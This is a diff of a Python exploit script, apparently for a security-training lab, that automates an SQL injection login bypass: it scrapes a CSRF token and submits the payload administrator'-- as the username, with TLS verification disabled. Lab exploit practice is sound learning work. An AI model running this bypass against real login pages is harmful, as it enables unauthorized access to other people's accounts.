@@ -6,30 +6,36 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 LAB_NAME = "SQL injection vulnerability allowing login bypass"
 
+
 def get_csrf_token(session, url, proxies=None):
-    r = session.get(url, verify=False, proxies=proxies)
+    r = session.get(url + "/login", verify=False, proxies=proxies)
     soup = BeautifulSoup(r.text, 'html.parser')
-    csrf = soup.find("input")['value']
-    return csrf
+    input_tag = soup.find("input", attrs={"name": "csrf"})
+    if input_tag:
+        return input_tag.get("value", "")
+    else:
+        raise Exception("CSRF token not found")
+
 
 def run(url, payload, proxies=None):
     """
     SQLi login bypass with CSRF token and session management
     """
     session = requests.Session()
+    session.proxies = proxies or {}
+
     try:
         csrf = get_csrf_token(session, url, proxies)
+
         data = {
             "csrf": csrf,
-            "username": payload,
+            "username": "administrator'--",
             "password": "anything"
         }
 
-        r = session.post(url, data=data, verify=False, proxies=proxies)
+        r = session.post(url.rstrip('/') + "/login", data=data, verify=False)
 
-        if "Log out" in r.text:
-            return True
-        return False
+        return "Log out" in r.text
 
     except Exception as e:
         print(f"[!] Error: {e}")
